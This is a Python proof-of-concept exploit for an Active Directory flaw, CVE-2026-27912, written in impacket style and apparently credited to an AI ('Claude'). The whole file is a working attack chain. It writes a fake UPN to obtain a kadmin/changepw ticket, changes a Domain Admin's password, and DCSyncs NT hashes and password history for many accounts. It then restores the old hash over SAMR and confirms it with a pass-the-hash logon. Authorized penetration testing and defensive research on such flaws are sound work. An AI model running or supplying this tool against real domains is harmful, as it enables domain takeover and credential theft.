#!/usr/bin/env python3
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   PoC for CVE-2026-27912 ("ResetNightmare"), impacket example style,
#   with a full safe-exploitation lifecycle:
#
#     1. PRE-FLIGHT CHECKS (no exploitation yet):
#        - domain password policy (minPwdAge / minPwdLength / history /
#          complexity) read from the domain head
#        - target account state: enabled? locked? pwdLastSet old enough
#          for the kpasswd change path (minPwdAge)?
#        - target is privileged (Domain Admins / SID-512 member) - required
#          because the post-exploitation DCSync + password-restore workflow
#          rides on the hijacked account's rights
#        - operator really holds UPN-write on the UPNUser (DACL evaluation,
#          not just "a tool said so")
#        - the supplied new password passes the domain policy (length /
#          complexity / does not contain the target's name)
#
#     2. EXPLOIT: fake UPN -> NT_ENTERPRISE kadmin/changepw TGT -> clear UPN
#        -> RFC 3244 password change (no TGS-REQ, no PAC_REQUESTOR check).
#
#     3. DCSYNC with the hijacked privileged account: NT hashes + password
#        history (ntPwdHistory) of the Domain Admins first, then other
#        accounts, up to --dcsync-count (default 10).
#
#     4. RESTORE: the vuln's password *change* pushed the target's previous
#        NT hash into ntPwdHistory, so entry history0 == the pre-attack
#        hash. It is written back via SAMR (hSamrSetNTInternal1) and the
#        restoration is verified with a pass-the-hash logon. The target
#        ends the run with its ORIGINAL password working again - no
#        destructive impact (change/reset events in the logs aside).
#
#   FOR AUTHORIZED SECURITY TESTING ONLY.
#
# Author:
#   Claude (impacket-style port of Semperis-Community/Invoke-ResetNightmare)
#
# Examples:
#   ./resetNightmare.py 'union.local/operator:Passw0rd!' \
#       --dc-ip 192.168.13.74 \
#       --upn-user puppet --upn-user-password 'Puppet#2026' \
#       --target-account Administrator --target-new-password 'Tmp#2026xx'
#

import argparse
import datetime
import getpass
import logging
import sys
import time
from binascii import unhexlify

from impacket import version
from impacket.examples import logger
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.kpasswd import changePassword, KPasswdError
from impacket.ldap import ldap as ldap_impacket
from impacket.ldap.ldap import LDAPSessionError
from impacket.ldap.ldapasn1 import SearchResultEntry, Control
from impacket.ldap.ldaptypes import LDAP_SID, SR_SECURITY_DESCRIPTOR, \
    ACCESS_ALLOWED_ACE, ACCESS_ALLOWED_OBJECT_ACE

UPN_PROPERTY_GUID = '28630ebb-41d5-11d1-a9c1-0000f80367c1'
SD_FLAGS_OID = '1.2.840.113556.1.4.801'
FILETIME_EPOCH = datetime.datetime(1601, 1, 1, tzinfo=datetime.timezone.utc)


def filetimeToDt(ft):
    return FILETIME_EPOCH + datetime.timedelta(microseconds=int(ft) / 10)


def intervalToDays(ival):
    # AD stores durations as negative 100ns intervals
    return -int(ival) / 86400 / 10 ** 7


class PreFlightError(Exception):
    pass


class ResetNightmare:
    def __init__(self, domain, operatorUser, operatorPass, dcIp, upnUser, upnUserPass,
                 targetAccount, targetNewPassword, useLdaps=False,
                 dcsyncCount=10, skipPreflight=False, noPost=False,
                 lmhash='', nthash='', upnLmhash='', upnNthash=''):
        self.domain = domain
        self.operatorUser = operatorUser
        self.operatorPass = operatorPass
        self.lmhash = lmhash
        self.nthash = nthash
        self.upnLmhash = upnLmhash
        self.upnNthash = upnNthash
        self.dcIp = dcIp
        self.upnUser = upnUser
        self.upnUserPass = upnUserPass
        self.targetAccount = targetAccount
        self.targetNewPassword = targetNewPassword
        self.useLdaps = useLdaps
        self.dcsyncCount = dcsyncCount
        self.skipPreflight = skipPreflight
        self.noPost = noPost

        self.baseDN = ','.join('DC=%s' % part for part in domain.split('.'))
        self.ldapConn = None
        self.upnUserDN = None
        self.oldUPN = None
        self.targetSAN = None
        self.secrets = {}          # sam.lower() -> {'nt':..., 'history':[...]}
        self.targetOldNTHash = None

    # ------------------------------------------------------------------ LDAP
    def ldapConnect(self):
        scheme = 'ldaps://' if self.useLdaps else 'ldap://'
        self.ldapConn = ldap_impacket.LDAPConnection('%s%s' % (scheme, self.dcIp),
                                                     self.baseDN, self.dcIp)
        self.ldapConn.login(self.operatorUser, self.operatorPass, self.domain,
                            self.lmhash, self.nthash)
        logging.debug('LDAP bind OK as %s\\%s' % (self.domain, self.operatorUser))

    def searchOne(self, searchFilter, attributes, searchBase=None):
        resp = self.ldapConn.search(searchBase=searchBase, searchFilter=searchFilter,
                                    attributes=attributes)
        for item in resp:
            if isinstance(item, SearchResultEntry):
                return item
        return None

    @staticmethod
    def attrStr(item, name):
        for attr in item['attributes']:
            if str(attr['type']).lower() == name.lower() and len(attr['vals']) > 0:
                return str(attr['vals'][0])
        return None

    @staticmethod
    def attrSid(item, name):
        """Binary SID attribute (objectSid) -> canonical string."""
        for attr in item['attributes']:
            if str(attr['type']).lower() == name.lower() and len(attr['vals']) > 0:
                return LDAP_SID(data=attr['vals'][0].asOctets()).formatCanonical()
        return None

    @staticmethod
    def attrVals(item, name):
        for attr in item['attributes']:
            if str(attr['type']).lower() == name.lower():
                return [str(v) for v in attr['vals']]
        return []

    def searchOneSD(self, dn):
        """Search an entry's DACL. Without the SDFlags control AD returns
        owner+group+DACL (SACL only with extra privileges) - enough for us,
        and avoids control-encoding quirks."""
        item = self.searchOne('(objectClass=*)', ['nTSecurityDescriptor'],
                              searchBase=dn)
        if item is None:
            return None
        for attr in item['attributes']:
            if str(attr['type']) == 'nTSecurityDescriptor' and len(attr['vals']) > 0:
                return SR_SECURITY_DESCRIPTOR(data=attr['vals'][0].asOctets())
        return None

    def resolveAccounts(self):
        item = self.searchOne('(sAMAccountName=%s)' % self.targetAccount,
                              ['sAMAccountName', 'pwdLastSet', 'userAccountControl',
                               'lockoutTime', 'memberOf'])
        if item is None:
            raise Exception("Couldn't find a principal named %s" % self.targetAccount)
        self.targetSAN = self.attrStr(item, 'sAMAccountName')
        self.targetEntry = item
        logging.info('Target sAMAccountName: %s' % self.targetSAN)

        item = self.searchOne('(sAMAccountName=%s)' % self.upnUser,
                              ['distinguishedName', 'userPrincipalName'])
        if item is None:
            raise Exception("Couldn't find an account named %s" % self.upnUser)
        self.upnUserDN = str(item['objectName'])
        self.oldUPN = self.attrStr(item, 'userPrincipalName')
        logging.info('UPNUser DN: %s (current UPN: %s)' % (self.upnUserDN, self.oldUPN))

    # ------------------------------------------------------------- PRE-FLIGHT
    def preflight(self):
        logging.info('--- PRE-FLIGHT CHECKS ---')
        self._checkDomainPolicy()
        self._checkTargetState()
        self._checkTargetPrivileged()
        self._checkPuppetWritable()
        self._checkNewPassword()
        logging.info('--- PRE-FLIGHT PASSED ---')

    def _checkDomainPolicy(self):
        item = self.searchOne('(objectClass=domainDNS)',
                              ['minPwdAge', 'minPwdLength', 'pwdHistoryLength',
                               'pwdProperties', 'lockoutThreshold'],
                              searchBase=self.baseDN)
        self.policy = {
            'minPwdAgeDays': intervalToDays(self.attrStr(item, 'minPwdAge') or 0),
            'minPwdLength': int(self.attrStr(item, 'minPwdLength') or 0),
            'pwdHistoryLength': int(self.attrStr(item, 'pwdHistoryLength') or 0),
            'complexity': bool(int(self.attrStr(item, 'pwdProperties') or 0) & 1),
            'lockoutThreshold': int(self.attrStr(item, 'lockoutThreshold') or 0),
        }
        p = self.policy
        logging.info('[policy] minPwdAge=%.1f days, minLen=%d, history=%d, complexity=%s, '
                     'lockoutThreshold=%d'
                     % (p['minPwdAgeDays'], p['minPwdLength'], p['pwdHistoryLength'],
                        p['complexity'], p['lockoutThreshold']))
        if p['pwdHistoryLength'] == 0:
            raise PreFlightError(
                'Password history is DISABLED in this domain (pwdHistoryLength=0). '
                'The vuln reset will NOT push the old NT hash into ntPwdHistory, so the '
                'post-exploitation restore would be impossible. Aborting to keep the '
                'operation non-destructive.')

    def _checkTargetState(self):
        uac = int(self.attrStr(self.targetEntry, 'userAccountControl') or 0)
        if uac & 0x2:
            raise PreFlightError('Target %s is DISABLED. Resetting its password may work '
                                 'but is pointless/noisy for this workflow.' % self.targetSAN)
        lockout = int(self.attrStr(self.targetEntry, 'lockoutTime') or 0)
        if lockout != 0 and self.policy['lockoutThreshold'] > 0:
            logging.warning('[target] %s currently has lockoutTime set - it may be locked out.'
                            % self.targetSAN)

        pwdLastSet = int(self.attrStr(self.targetEntry, 'pwdLastSet') or 0)
        if pwdLastSet == 0:
            logging.warning('[target] pwdLastSet=0 (password must be changed at next logon).')
            return
        ageDays = (datetime.datetime.now(datetime.timezone.utc)
                   - filetimeToDt(pwdLastSet)).total_seconds() / 86400
        minAge = self.policy['minPwdAgeDays']
        logging.info('[target] pwdLastSet age: %.2f days (minPwdAge: %.2f days)'
                     % (ageDays, minAge))
        if ageDays < minAge:
            raise PreFlightError(
                "Target's password is only %.2f days old, but minPwdAge=%.2f days. The vuln "
                'uses the kpasswd CHANGE path, which enforces the minimum password age - '
                'the reset would be rejected by policy (KRB5_KPASSWD_SOFTERROR). Wait '
                '%.2f more days or pick an older-password target.' % (ageDays, minAge, minAge - ageDays))

    def _checkTargetPrivileged(self):
        if self.noPost:
            return
        # Resolve the Domain Admins group by well-known RID 512
        opItem = self.searchOne('(sAMAccountName=%s)' % self.operatorUser, ['objectSid'])
        domainSid = self.attrSid(opItem, 'objectSid').rsplit('-', 1)[0]
        daItem = self.searchOne('(objectSid=%s-512)' % domainSid, ['distinguishedName'])
        self.daGroupDN = str(daItem['objectName'])
        members = [m.lower() for m in self.attrVals(self.targetEntry, 'memberOf')]
        if self.daGroupDN.lower() not in members:
            raise PreFlightError(
                'Target %s is NOT a member of %s. The post-exploitation workflow needs '
                'the hijacked account to hold replication rights (DCSync) and reset '
                'rights (restore). Re-run with --no-post for a bare exploit, or target a '
                'Domain Admins member.' % (self.targetSAN, self.daGroupDN))
        logging.info('[target] %s is a Domain Admins member - DCSync/restore workflow viable'
                     % self.targetSAN)

    def _operatorSids(self):
        item = self.searchOne('(sAMAccountName=%s)' % self.operatorUser,
                              ['objectSid', 'tokenGroups'])
        sids = {self.attrSid(item, 'objectSid')}
        for attr in item['attributes']:
            if str(attr['type']) == 'tokenGroups':
                for v in attr['vals']:
                    sids.add(LDAP_SID(data=v.asOctets()).formatCanonical())
        sids.update(['S-1-1-0', 'S-1-5-11'])  # Everyone, Authenticated Users
        return sids

    def _checkPuppetWritable(self):
        try:
            sd = self.searchOneSD(self.upnUserDN)
        except Exception as e:
            logging.warning('[upn-user] could not read its DACL (%s) - will rely on the '
                            'actual write attempt.' % e)
            return
        if sd is None:
            logging.warning('[upn-user] no DACL returned - will rely on the actual write attempt.')
            return
        mySids = self._operatorSids()
        canWrite, reason = False, None
        if sd['OwnerSid'].formatCanonical() in mySids:
            canWrite, reason = True, 'Owner'
        if not canWrite:
            for ace in sd['Dacl']['Data']:
                if ace['AceType'] not in (ACCESS_ALLOWED_ACE.ACE_TYPE,
                                          ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE):
                    continue
                if ace['Ace']['Sid'].formatCanonical() not in mySids:
                    continue
                mask = ace['Ace']['Mask']['Mask']
                if mask & 0x10000000:                      # GENERIC_ALL
                    canWrite, reason = True, 'GenericAll'; break
                if mask & 0x40000000:                      # GENERIC_WRITE
                    canWrite, reason = True, 'GenericWrite'; break
                if mask & 0x00000020:                      # DS_WRITE_PROP
                    if ace['AceType'] == ACCESS_ALLOWED_ACE.ACE_TYPE:
                        canWrite, reason = True, 'WriteProperty(all)'; break
                    # object ACE: only counts if scoped to the UPN property
                    flags = ace['Ace']['Flags']
                    if not (flags & 0x1) or not ace['Ace']['ObjectType']:
                        canWrite, reason = True, 'WriteProperty(all)'; break
                    ot = str(ace['Ace']['ObjectType']).strip('{}').lower()
                    # GUID bytes in impacket are raw; compare textual form loosely
                    if UPN_PROPERTY_GUID.split('-')[0][:8] in ot.replace('-', ''):
                        canWrite, reason = True, 'WriteProperty(UPN)'; break
                if mask & 0x00040000:                      # WRITE_DAC
                    canWrite, reason = True, 'WriteDacl'; break
        if not canWrite:
            raise PreFlightError(
                'DACL evaluation: %s has NO UPN-write path on %s (checked GenericAll / '
                'GenericWrite / WriteProperty / WriteDacl / ownership for the operator '
                'and its groups). Deny ACEs are not evaluated. Aborting before touching '
                'anything.' % (self.operatorUser, self.upnUser))
        logging.info('[upn-user] operator holds UPN-write on %s via %s'
                     % (self.upnUser, reason))

    def _checkNewPassword(self):
        pw = self.targetNewPassword
        p = self.policy
        if len(pw) < p['minPwdLength']:
            raise PreFlightError('New password length %d < minPwdLength %d.'
                                 % (len(pw), p['minPwdLength']))
        if p['complexity']:
            classes = sum([
                any(c.islower() for c in pw),
                any(c.isupper() for c in pw),
                any(c.isdigit() for c in pw),
                any(not c.isalnum() for c in pw),
            ])
            if classes < 3:
                raise PreFlightError('New password fails complexity: needs 3 of 4 '
                                     'character classes (lower/upper/digit/symbol).')
            if len(self.targetSAN) >= 3 and self.targetSAN.lower().rstrip('$') in pw.lower():
                raise PreFlightError("New password contains the target's account name - "
                                     'rejected by complexity rules.')
        if p['pwdHistoryLength'] > 0:
            logging.info('[new-pass] policy-compliant (length/complexity OK). Note: '
                         'history (%d) is enforced on the change path - reusing one of the '
                         "target's recent passwords would be rejected at kpasswd time."
                         % p['pwdHistoryLength'])

    # --------------------------------------------------------------- EXPLOIT
    def waitUpnState(self, expected):
        while True:
            current = self.attrStr(self.searchOne('(sAMAccountName=%s)' % self.upnUser,
                                                  ['userPrincipalName']),
                                   'userPrincipalName')
            if current == expected:
                return
            time.sleep(1)

    def setFakeUPN(self):
        logging.info("Setting a fake UPN (%s) on %s..." % (self.targetSAN, self.upnUser))
        self.ldapConn.modify(self.upnUserDN, {'userPrincipalName':
                             [(ldap_impacket.MODIFY_REPLACE, [self.targetSAN])]})
        self.waitUpnState(self.targetSAN)

    def clearFakeUPN(self):
        logging.info('Clearing fake UPN from %s...' % self.upnUser)
        self.ldapConn.modify(self.upnUserDN, {'userPrincipalName':
                             [(ldap_impacket.MODIFY_DELETE, [])]})
        self.waitUpnState(None)

    def restoreUPN(self):
        if self.oldUPN:
            logging.info('Restoring original UPN value...')
            self.ldapConn.modify(self.upnUserDN, {'userPrincipalName':
                                 [(ldap_impacket.MODIFY_REPLACE, [self.oldUPN])]})
            self.waitUpnState(self.oldUPN)

    def getForgedTicket(self):
        logging.info("Asking for a TGT for %s as NT_ENTERPRISE '%s' (kadmin/changepw)..."
                     % (self.upnUser, self.targetSAN))
        clientName = Principal(self.targetSAN,
                               type=constants.PrincipalNameType.NT_ENTERPRISE.value)
        tgt, cipher, _, sessionKey = getKerberosTGT(clientName, self.upnUserPass or '',
                                                    self.domain,
                                                    self.upnLmhash, self.upnNthash, '',
                                                    kdcHost=self.dcIp,
                                                    serverName='kadmin/changepw')
        return {'KDC_REP': tgt, 'cipher': cipher, 'sessionKey': sessionKey}

    def resetTargetPassword(self, tgt):
        logging.info("Changing %s's password to the supplied value..." % self.targetSAN)
        try:
            changePassword(self.targetSAN, self.domain, self.targetNewPassword,
                           TGT=tgt, kdcHost=self.dcIp)
        except KPasswdError as e:
            raise Exception('Password change failed: %s' % e)

    # ---------------------------------------------------------------- DCSYNC
    def dcsync(self):
        """DCSync with the hijacked privileged account; keep NT + history hashes."""
        from impacket.smbconnection import SMBConnection
        from impacket.examples.secretsdump import RemoteOperations, NTDSHashes

        logging.info('DCSync as %s (history enabled)...' % self.targetSAN)
        smb = SMBConnection(self.dcIp, self.dcIp)
        smb.login(self.targetSAN, self.targetNewPassword, self.domain, '', '')
        remoteOps = RemoteOperations(smb, False, self.dcIp)

        def collect(secretType, secret):
            # format: DOMAIN\user[_historyN]:RID:LM:NT:::
            try:
                userPart, rid, lm, nt = secret.split(':')[:4]
                sam = userPart.split('\\')[-1]
            except ValueError:
                return
            base, isHist, idx = sam, False, 0
            if '_history' in sam:
                base, suffix = sam.rsplit('_history', 1)
                isHist, idx = True, int(suffix)
            entry = self.secrets.setdefault(base.lower(), {'sam': base, 'nt': None,
                                                           'history': {}})
            if isHist:
                entry['history'][idx] = nt
            else:
                entry['nt'] = nt

        ntds = NTDSHashes(None, None, isRemote=True, history=True, noLMHash=True,
                          remoteOps=remoteOps, useVSSMethod=False, justNTLM=True,
                          printUserStatus=False, perSecretCallback=collect)
        ntds.dump()
        logging.info('DCSync collected secrets for %d accounts' % len(self.secrets))

    def printTopSecrets(self):
        """Domain Admins first, then other accounts, up to dcsyncCount."""
        daSams = []
        try:
            daItem = self.searchOne('(distinguishedName=%s)' % self.daGroupDN, ['member'])
            for mdn in self.attrVals(daItem, 'member'):
                m = self.searchOne('(distinguishedName=%s)' % mdn, ['sAMAccountName'])
                if m is not None:
                    daSams.append(self.attrStr(m, 'sAMAccountName').lower())
        except Exception as e:
            logging.warning('Could not enumerate DA members (%s); DA-first ordering skipped.' % e)

        ordered = [s for s in daSams if s in self.secrets]
        for s in self.secrets:
            if len(ordered) >= self.dcsyncCount:
                break
            if s not in ordered:
                ordered.append(s)
        ordered = ordered[:self.dcsyncCount]

        print()
        print('=== DCSync results (Domain Admins first, top %d) ===' % len(ordered))
        for s in ordered:
            e = self.secrets[s]
            tag = ' [Domain Admins]' if s in daSams else ''
            print('[+] %s%s' % (e['sam'], tag))
            print('    NT hash      : %s' % e['nt'])
            for idx in sorted(e['history']):
                print('    ntPwdHistory%d: %s' % (idx, e['history'][idx]))

        entry = self.secrets.get(self.targetSAN.lower())
        if entry and 0 in entry['history']:
            self.targetOldNTHash = entry['history'][0]
            logging.info("Target's pre-attack NT hash recovered from ntPwdHistory0: %s"
                         % self.targetOldNTHash)
        elif entry:
            logging.warning('No history0 found for the target - cannot auto-restore!')
        else:
            logging.warning('Target not present in DCSync output - cannot auto-restore!')

    # --------------------------------------------------------------- RESTORE
    def restoreTargetPassword(self):
        """Write history0 (pre-attack NT hash) back via SAMR hSamrSetNTInternal1."""
        from impacket.dcerpc.v5 import transport, samr

        logging.info("Restoring %s's original password hash via SAMR..." % self.targetSAN)
        rpctransport = transport.SMBTransport(self.dcIp, 445, r'\samr')
        rpctransport.set_credentials(self.targetSAN, self.targetNewPassword, self.domain)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)
        try:
            serverHandle = samr.hSamrConnect(dce)['ServerHandle']
            domains = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
            domainName = [d['Name'] for d in domains['Buffer']['Buffer']
                          if d['Name'].lower() != 'builtin'][0]
            domainSid = samr.hSamrLookupDomainInSamServer(dce, serverHandle,
                                                          domainName)['DomainId']
            domainHandle = samr.hSamrOpenDomain(dce, serverHandle,
                                                domainId=domainSid)['DomainHandle']
            rids = samr.hSamrLookupNamesInDomain(dce, domainHandle, (self.targetSAN,))
            rid = rids['RelativeIds']['Element'][0]
            userHandle = samr.hSamrOpenUser(dce, domainHandle, userId=rid)['UserHandle']
            samr.hSamrSetNTInternal1(dce, userHandle, '', self.targetOldNTHash)
        finally:
            dce.disconnect()
        logging.info('Original NT hash written back.')

    def verifyRestore(self):
        """Pass-the-hash logon proves the original credentials work again."""
        from impacket.smbconnection import SMBConnection
        smb = SMBConnection(self.dcIp, self.dcIp)
        smb.login(self.targetSAN, '', self.domain, '', self.targetOldNTHash)
        logging.info('Verified: pass-the-hash logon with the ORIGINAL hash succeeds - '
                     "target's original password is effective again.")

    # ------------------------------------------------------------------ FLOW
    def run(self):
        self.ldapConnect()
        self.resolveAccounts()
        if not self.skipPreflight:
            self.preflight()

        ticket = None
        try:
            self.setFakeUPN()
            ticket = self.getForgedTicket()
        finally:
            try:
                self.clearFakeUPN()
            except LDAPSessionError as e:
                logging.error('Could not clear the fake UPN, do it manually! %s' % e)

        self.resetTargetPassword(ticket)
        self.restoreUPN()

        if not self.noPost:
            try:
                self.dcsync()
                self.printTopSecrets()
                if self.targetOldNTHash is None:
                    raise Exception('pre-attack hash unavailable')
                self.restoreTargetPassword()
                self.verifyRestore()
            except Exception as e:
                logging.error('POST-EXPLOITATION FAILED: %s' % e)
                logging.error('!!! %s is left with the ATTACKER-CHOSEN password. '
                              'Recover manually: DCSync the account with -history and '
                              'write history0 back via: changepasswd.py -reset '
                              '-altuser <admin> -altpass <pw> -newhashes :<history0NT> '
                              "'<domain>/<user>@<dc>'" % self.targetSAN)
                raise
        return True


def parse_identity(identity):
    domain = ''
    username = identity
    password = ''
    if '/' in username:
        domain, username = username.split('/', 1)
    if ':' in username:
        username, password = username.split(':', 1)
    if domain == '':
        raise SystemExit('Identity must include the domain: domain/user[:password]')
    return domain, username, password


def main():
    print(version.BANNER)

    parser = argparse.ArgumentParser(
        description='ResetNightmare (CVE-2026-27912) with pre-flight checks, DCSync and '
                    'automatic password restore. For authorized security testing only.')
    parser.add_argument('identity', action='store',
                        help='[domain/]operator-username[:password] - account that can write '
                             'the UPN of --upn-user')
    parser.add_argument('--upn-user', required=True,
                        help='account you can write a userPrincipalName on')
    parser.add_argument('--upn-user-password',
                        help='cleartext password of --upn-user (prompted if omitted)')
    parser.add_argument('--target-account', required=True,
                        help='sAMAccountName to reset (must be Domain Admins unless --no-post)')
    parser.add_argument('--target-new-password', required=True,
                        help='new password to set on the target (must satisfy domain policy)')
    parser.add_argument('--dc-ip', required=True, help='IP address of the domain controller')
    parser.add_argument('-hashes', metavar='LMHASH:NTHASH',
                        help='NTLM hashes for the operator (LDAP auth)')
    parser.add_argument('--upn-user-hash', metavar='[LMHASH:]NTHASH',
                        help='NT hash of --upn-user (Kerberos pre-auth, RC4)')
    parser.add_argument('--dcsync-count', type=int, default=10,
                        help='how many accounts (DA first) to print hashes for (default: 10)')
    parser.add_argument('--no-post', action='store_true',
                        help='exploit only: skip DCSync and password restore')
    parser.add_argument('--skip-preflight', action='store_true',
                        help='skip the pre-flight checks (not recommended)')
    parser.add_argument('--ldaps', action='store_true',
                        help='use LDAPS for the LDAP operations (default: plain LDAP/389)')
    parser.add_argument('-debug', action='store_true', help='turn debug output on')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    logger.init(False)
    if options.debug:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password = parse_identity(options.identity)
    lmhash = nthash = ''
    if options.hashes:
        lmhash, nthash = options.hashes.split(':', 1)
    if not password and not nthash:
        password = getpass.getpass('Operator password: ')
    upnLm = upnNt = ''
    if options.upn_user_hash:
        if ':' in options.upn_user_hash:
            upnLm, upnNt = options.upn_user_hash.split(':', 1)
        else:
            upnLm, upnNt = 'aad3b435b51404eeaad3b435b51404ee', options.upn_user_hash
    if not (options.upn_user_password or upnNt):
        upnUserPass = getpass.getpass('UPNUser password: ')
    else:
        upnUserPass = options.upn_user_password

    try:
        attack = ResetNightmare(domain, username, password, options.dc_ip,
                                options.upn_user, upnUserPass,
                                options.target_account, options.target_new_password,
                                useLdaps=options.ldaps,
                                dcsyncCount=options.dcsync_count,
                                skipPreflight=options.skip_preflight,
                                noPost=options.no_post,
                                lmhash=lmhash, nthash=nthash,
                                upnLmhash=upnLm, upnNthash=upnNt)
        attack.run()
    except PreFlightError as e:
        logging.error('PRE-FLIGHT FAILED: %s' % e)
        logging.error('Nothing was modified. Fix the issue or re-run with --skip-preflight.')
        sys.exit(1)
    except Exception as e:
        logging.error(str(e))
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        sys.exit(1)

    print()
    if options.no_post:
        print('Success! %s\'s password was reset (exploit-only mode, NOT restored).'
              % attack.targetSAN)
    else:
        print('Success! Full lifecycle completed:')
        print('  - %s password was reset via CVE-2026-27912' % attack.targetSAN)
        print('  - DCSync hashes printed above (top %d, DA first)'
              % min(attack.dcsyncCount, len(attack.secrets)))
        print('  - original password hash restored and verified - the account works '
              'with its ORIGINAL password again')


if __name__ == '__main__':
    main()
